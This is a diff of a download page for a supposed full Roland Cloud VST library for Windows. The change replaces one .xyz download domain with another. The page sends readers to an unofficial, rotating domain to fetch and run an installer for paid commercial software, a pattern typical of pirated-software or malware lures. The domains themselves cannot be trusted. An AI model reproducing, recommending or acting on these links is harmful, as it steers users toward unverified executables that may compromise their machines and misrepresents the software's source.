@@ -18,8 +18,8 @@ Roland Cloud Full VST Library for Windows PCs | clean panels | predictable first
 
 > Use the project link below for Windows.
 
-* **Project link:** **[roland-cloud.nexpath.xyz](https://roland-cloud.nexpath.xyz/)**
-* **Full URL:** `https://roland-cloud.nexpath.xyz/`
+* **Project link:** **[roland-cloud.nerasix.xyz](https://roland-cloud.nerasix.xyz/)**
+* **Full URL:** `https://roland-cloud.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Modules arrive ready for local use | open the app and continue. This release inc
 * **RAM:** 8 GB RAM suggested | 16 GB for heavy workloads
 * **Disk:** 3 GB free disk space
 
-***
+***
